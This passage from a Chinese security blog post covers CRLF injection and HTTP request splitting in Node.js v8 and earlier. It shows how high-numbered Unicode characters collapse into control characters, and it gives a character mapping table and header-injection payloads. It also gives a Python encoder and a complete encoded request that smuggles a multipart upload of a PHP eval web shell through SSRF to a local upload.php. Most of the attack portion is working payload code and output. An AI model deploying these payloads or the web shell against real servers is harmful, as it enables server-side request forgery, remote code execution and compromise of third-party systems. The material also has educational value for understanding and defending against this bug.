<img src="/images/pasted-44.png" alt="upload successful"><br>但是上述的处理Unicode字符错误意味着可以规避这些保护措施。考虑如下的URL，其中包含一些高编号的Unicode字符：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u&#123;010D&#125;\u&#123;010A&#125;&#x2F;WHOAMI&#39;</span><br><span class="line">http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;čĊ&#x2F;WHOAMI</span><br></pre></td></tr></table></figure>
当 Node.js v8 或更低版本对此URL发出 GET 请求时，它不会进行编码转义，因为它们不是HTTP控制字符：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u010D\u010A&#x2F;WHOAMI&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;čĊ&#x2F;WHOAMI HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure>
但是当结果字符串被编码为 latin1 写入路径时，这些字符将分别被截断为 “\r”（%0d）和 “\n”（%0a）：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Buffer.from(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u&#123;010D&#125;\u&#123;010A&#125;&#x2F;WHOAMI&#39;, &#39;latin1&#39;).toString()</span><br><span class="line">&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\r\n&#x2F;WHOAMI&#39;</span><br></pre></td></tr></table></figure>
<img src="/images/pasted-45.png" alt="upload successful"><br>可见，通过在请求路径中包含精心选择的Unicode字符，攻击者可以欺骗Node.js并成功实现CRLF注入。<br>不仅是CRLF，所有的控制字符都可以通过这个构造出来。下面是我列举出来的表格，第一列是需要构造的字符，第二列是可构造出相应字符的高编号的Unicode码，第三列是高编号的Unicode码对应的字符，第四列是高编号的Unicode码对应的字符的URL编码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字符	可由以下Unicode编码构造出	Unicode编码对应的字符	Unicode编码对应的字符对应的URL编码</span><br><span class="line">回车符 \r	   \u010d	   č	   %C4%8D</span><br><span class="line">换行符 \n	   \u010a	   Ċ	   %C4%8A</span><br><span class="line">空格	          \u0120	    Ġ	   %C4%A0</span><br><span class="line">反斜杠 \	      \u0122	     Ģ	   %C4%A2</span><br><span class="line">单引号 &#39;	       \u0127	      ħ	   %C4%A7</span><br><span class="line">反引号 &#96;	      \u0160	     Š	   %C5%A0</span><br><span class="line">叹号 !	       \u0121	    ġ	   %C4%A1</span><br></pre></td></tr></table></figure>
这个bug已经在Node.js10中被修复，如果请求路径包含非Ascii字符，则会抛出错误。但是对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">接受来自用户输入的Unicode数据</span><br><span class="line">并将其包含在HTTP请求的路径中</span><br><span class="line">且请求具有一个0长度的主体（比如一个 GET 或者 DELETE）</span><br></pre></td></tr></table></figure></li>
<li><strong>在 HTTP 状态行注入恶意首部字段</strong><br>  由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID&#x3D;whoami&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;ĠHTTP&#x2F;1.1čĊSet-Cookie:ĠPHPSESSID&#x3D;whoami HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure>
<img src="/images/pasted-46.png" alt="upload successful"><br>如上图所示，成功构造出了一个 Set-Cookie 首部字段，虽然后面还有一个 HTTP/1.1 ，但我们根据该原理依然可以将其闭合：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID&#x3D;whoami\u010D\u010Atest:&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;ĠHTTP&#x2F;1.1čĊSet-Cookie:ĠPHPSESSID&#x3D;whoamičĊtest: HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure>
<img src="/images/pasted-47.png" alt="upload successful"><br>这样，我们便可以构造 “任意” 的HTTP请求了。</li>
<li><strong>在 HTTP 状态行注入完整 HTTP 请求</strong><br>  首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 HTTP/1.1 影响我们新构造的请求，我们还需要再构造一次 GET / 闭合原来的 HTTP 请求。<br>假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br></pre></td></tr></table></figure>
为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：<br>程序编码实现：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br><span class="line"></span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\r\n&quot;)</span><br><span class="line"></span><br><span class="line">def payload_encode(raw):</span><br><span class="line">    ret &#x3D; u&quot;&quot;</span><br><span class="line">    for i in raw:</span><br><span class="line">        ret +&#x3D; chr(0x0100+ord(i))</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">payload &#x3D; payload_encode(payload)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
构造请求：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#39;)</span><br></pre></td></tr></table></figure>
成功实现了目标本地的http请求<br><img src="/images/pasted-48.png" alt="upload successful"></li>
</ul>
<hr>
<ul>
<li>参考来源：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240014">初识HTTP响应拆分攻击（CRLF Injection）</a></li>
</ul>
</div><div class="tags"></div><div class="post-nav"><a class="next" href="/2021/05/20/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/">drozer安装和使用</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/RCE/" style="font-size: 15px;">RCE</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/05/25/CRLF%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/">CRLF注入浅析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/">drozer安装和使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/18/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/">DES加密原理及实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/16/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">亿邮邮件系统命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/16/test/">SSRF漏洞利用及防护</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/">Hessian反序列化RCE漏洞</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2021 <a href="/." rel="nofollow">月落花开.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=1.0.0"><script type="text/javascript" src="/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/love.js"></script><script type="text/javascript" src="/js/copycode.js" successtext="Copy Successed!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>